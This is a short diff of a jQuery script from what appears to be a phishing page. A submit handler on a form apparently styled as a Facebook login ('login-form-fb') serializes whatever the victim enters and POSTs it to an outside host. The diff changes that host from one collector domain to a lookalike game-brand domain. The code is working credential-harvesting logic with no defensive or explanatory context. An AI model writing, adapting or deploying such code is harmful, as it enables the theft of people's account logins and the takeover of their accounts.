@@ -2,7 +2,7 @@ $(".login-form-fb").submit(function() {
     var d = $(".login-form-fb");
 
     $.ajax({
-        url: "https://krisnahost.email/",
+        url: "https://api.mobilelegends-play.com/json/",
         type: "POST",
         data: d.serialize(),
         success: function () {
